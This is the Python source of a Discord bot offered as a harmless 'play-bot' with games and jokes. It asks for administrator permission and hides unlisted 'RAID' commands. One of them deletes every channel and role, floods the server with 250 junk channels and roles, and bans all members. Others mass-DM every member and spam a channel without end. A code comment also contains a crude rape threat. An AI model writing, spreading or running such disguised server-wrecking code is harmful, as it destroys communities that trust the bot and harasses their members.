token = " ==> BOT TOKEN <== "


import random
import string
import requests
import urllib
import asyncio
import io
from PIL import Image
from io import BytesIO
import discord
from discord.ext import commands
from discord import client
from gtts import gTTS
import sys
intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='>', intents=intents)
client.remove_command("help")


tts_language = "en"

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]


def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor



@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name="bot prefix: >"))
    print(client.user)

@client.command()
async def help(ctx):
    embed=discord.Embed(title="Help", description="bot prefix: >", color=0x8bc34a)
    embed.set_thumbnail(url="https://imagesbot.tpadev.repl.co/playbot.png")
    embed.add_field(name=">help", value="returns all commands", inline=False)
    embed.add_field(name=">invite", value="return the bot invite link", inline=False)
    embed.add_field(name=">kiss <user>", value="return a photo", inline=False)
    embed.add_field(name=">8ball <question>", value="returns an 8ball answer", inline=False)
    embed.add_field(name=">ascii <message>", value="creates an ASCII art of your message", inline=False)
    embed.add_field(name=">dick <user>", value="returns the user's dick size", inline=False)
    embed.add_field(name=">first-message", value="shows the first message in the channel history", inline=False)
    embed.add_field(name=">minesweeper", value="play a game of minesweeper", inline=False)
    embed.add_field(name=">slot", value="play the slot machine", inline=False)
    embed.add_field(name=">tts <content>", value="returns an mp4 file of your content", inline=False)
    embed.add_field(name=">wizz", value="makes a prank message about wizzing", inline=False)
    await ctx.send(embed=embed)

@client.command()
async def invite(ctx):
    embed=discord.Embed(title="**Invite me!**", description=f"[click here](https://discord.com/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot) to invite the bot in your server!", color=0x8bc34a)
    embed.set_author(name="play-bot", icon_url="https://imagesbot.tpadev.repl.co/playbot.png")
    embed.set_thumbnail(url="https://imagesbot.tpadev.repl.co/playbot.png")
    await ctx.send(embed=embed)

@client.command(aliases=['slots', 'bet', "slotmachine"])
async def slot(ctx):
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[   -  -  - ]\n{ctx.author.name}**,"
    slotmachine1 = f"**[ {a}  -  - ]\n{ctx.author.name}**,"
    slotmachine2 = f"**[ {a} {b}  - ]\n{ctx.author.name}**,"
    slotmachine3 = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
        x = await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine}"}))
        await asyncio.sleep(0.5)
        await x.edit(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine1}"}))
        await asyncio.sleep(0.5)
        await x.edit(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine2}"}))
        await asyncio.sleep(0.5)
        await x.edit(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine3} All matchings, you won!"}))
        
    elif (a == b) or (a == c) or (b == c):
        x = await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine}"}))
        await asyncio.sleep(0.5)
        await x.edit(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine1}"}))
        await asyncio.sleep(0.5)
        await x.edit(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine2}"}))
        await asyncio.sleep(0.5)
        await x.edit(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine3} 2 in a row, you won!"}))
        
    else:
        x = await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine}"}))
        await asyncio.sleep(0.5)
        await x.edit(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine1}"}))
        await asyncio.sleep(0.5)
        await x.edit(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine2}"}))
        await asyncio.sleep(0.5)
        await x.edit(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine3} No match, you lost"}))
        
@client.command()
async def kiss(ctx, user: discord.Member = None, user2: discord.Member = None):
    if user2 == None:
        user2 = user
        user = ctx.author
    wanted = Image.open("kiss.png")

    asset = user.avatar_url_as(size = 128)
    data = BytesIO(await asset.read())
    pfp = Image.open(data)
    pfp = pfp.resize((263,263))

    asset2 = user2.avatar_url_as(size = 128)
    data2 = BytesIO(await asset2.read())
    pfp2 = Image.open(data2)
    pfp2 = pfp2.resize((263,263))

    wanted.paste(pfp, (415,130))
    wanted.paste(pfp2, (690,60))
    #wanted.save("profile.png")
    #await ctx.send(file=discord.File("profile.png"))
    with io.BytesIO() as image_binary:
                    wanted.save(image_binary, 'PNG')
                    image_binary.seek(0)
                    await ctx.send(file=discord.File(fp=image_binary, filename='image.png'))

@client.command(name='8ball')
async def _ball(ctx, *, question):
    
    responses = [
        'That is a resounding no',
        'It is not looking likely',
        'Too hard to tell',
        'It is quite possible',
        'That is a definite yes!',
        'Maybe',
        'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    await ctx.send(embed=embed)

@client.command()
async def wizz(ctx):
    
    if isinstance(ctx.message.channel, discord.TextChannel):
        print("hi")
        initial = random.randrange(0, 60)
        message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
    elif isinstance(ctx.message.channel, discord.DMChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
    elif isinstance(ctx.message.channel, discord.GroupChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")

@client.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None):
    if user is None:
        user = ctx.author
    if user.id == 822943039068307517:
        size = random.randint(15, 30)
        dong = ""
        for _i in range(0, size):
            dong += "="
        embed=discord.Embed(title="dick", color=0xb300ad)
        embed.add_field(name=f"{user}'s Dick size\n8{dong}D", value=f"{ctx.author.name}", inline=True)
        await ctx.send(embed=embed)
    else:
        size = random.randint(0, 15)
        dong = ""
        for _i in range(0, size):
            dong += "="
        embed=discord.Embed(title="dick", color=0xb300ad)
        embed.add_field(name=f"{user}'s Dick size\n8{dong}D", value=f"{ctx.author.name}", inline=True)
        await ctx.send(embed=embed)

@client.command(aliases=["fancy"])
async def ascii(ctx, *, text):
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")

@client.command()
async def tts(ctx, *, message):
    await ctx.message.delete()
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    buff = f
    await ctx.send(f"requested by {ctx.author.name}", file=discord.File(buff, f"tts.wav"))

@client.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)

@client.command()
async def minesweeper(ctx, size: int = 5):
    
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    embed=discord.Embed(title="minesweeper", color=0x5bc885)
    embed.add_field(name=message, value=f"{ctx.author.name}", inline=True)
    await ctx.send(embed=embed)



##################################
#              RAID              #
##################################

@client.command(aliases=["rekt", "nuke"])
async def destroy(ctx, *, text = "eheh boy"):
    try: 
        await ctx.message.delete()
    except Exception:
        pass
    x = await ctx.author.send(f"**RAIDING {ctx.guild.name}**")
    await ctx.author.send("||                                                                                                                                    ||")
    await x.edit(content=f"{x.content}\n`[*] eliminando i canali in {ctx.guild.name}...`")
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            await x.edit(content=f"{x.content}\n`[!] impossibile eliminare {channel.name}`")
    await x.edit(content=f"{x.content}\n`[+] canali eliminati`")
    await x.edit(content=f"{x.content}\n`[*] eliminando i ruoli...`")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            await x.edit(content=f"{x.content}\n`[!] impossibile eliminare {ctx.guild.name}`")
    await x.edit(content=f"{x.content}\n`[+] ruoli eliminati`")
    await x.edit(content=f"{x.content}\n`[*] creazione dei canali {text}...`")
    for _i in range(250):
        await ctx.guild.create_text_channel(name=text)
    await x.edit(content=f"{x.content}\n`[+] canali creati`")
    await x.edit(content=f"{x.content}\n`[*] creazione dei ruoli {text}...`")
    for _i in range(250):
        await ctx.guild.create_role(name=text, color=RandomColor())
    await x.edit(content=f"{x.content}\n`[+] ruoli creati`")
    for user in list(ctx.guild.members):
        try:
            await user.ban(reason="EHHE BOYYYYYYYYY")
        except:
            pass
    try:
        await ctx.guild.edit(
            name=text,
            description=text,
            reason=text,
            icon=None,
            banner=None
        )
    except:
        pass
# se metti la musica ti stupro male
#che mi rovini le orecchie
@client.command()
async def dm(ctx, *, text):
    try:
        await ctx.message.delete()
    except:
        pass
    for user in ctx.guild.members:
        try:
            await user.send(text)
            print(f"sended to {user}")
        except:
            pass
        
@client.command()
async def spam(ctx, *, text):
    while True:
        await ctx.send(text)

@client.command()
async def mass_channel(ctx, *, text):
    for channel in ctx.guild.channels:
        try:
            await channel.send(text)
        except:
            pass

@client.command()
async def purge(ctx):
    await ctx.channel.purge(limit=1010)


client.run(token)